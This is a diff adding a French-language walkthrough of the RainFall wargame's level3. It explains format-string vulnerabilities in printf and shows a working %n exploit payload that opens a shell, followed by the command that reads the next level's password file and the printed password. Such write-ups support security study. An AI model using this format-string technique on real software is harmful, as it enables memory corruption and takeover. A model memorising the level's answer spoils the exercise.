@@ -1,0 +1,18 @@
+Lorsque %s est utilisé comme spécificateur de format, la fonction traitera les données sur la pile comme une adresse à partir de laquelle aller chercher une chaîne. C'est ce qu'on appelle le passage par référence. Cela signifie que l'attaquant peut potentiellement faire lire %s à partir de n'importe quelle adresse, même si les données ne se trouvent pas sur la pile.
+
+Mais comment contrôlez-vous l'adresse à laquelle accède %s ? Vous devrez placer une adresse sur la pile et faire en sorte que %s déréférence cette adresse !
+
+Et commodément, la chaîne de format (que vous contrôlez entièrement) est stockée sur la pile ! Donc, si vous pouvez placer l'adresse sur la chaîne de format et demander à %s de la déréférencer, vous pouvez essentiellement accéder aux données au-delà de la pile.
+
+printf("\xef\xbe\xad\xde%x%x%x%s", A, B, C);
+Par exemple, ce qui précède obligera printf() à imprimer la chaîne située à l'adresse 0xdeadbeef. La série de %x est utilisée pour parcourir la pile jusqu'à l'emplacement de la chaîne de format, et le nombre de %x nécessaires variera au cas par cas. Le %s indique à printf() de traiter les quatre premiers octets de votre chaîne de format comme un pointeur vers la chaîne à imprimer.
+
+200b7fd1ac0b7ff37d0
+
+level3@RainFall:~$ (python2 -c 'print("\x8c\x98\x04\x08"+"A"*60+"%4$n")'; cat) | ./level3 
+�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Wait what?!
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+^C
+level3@RainFall:~$ 
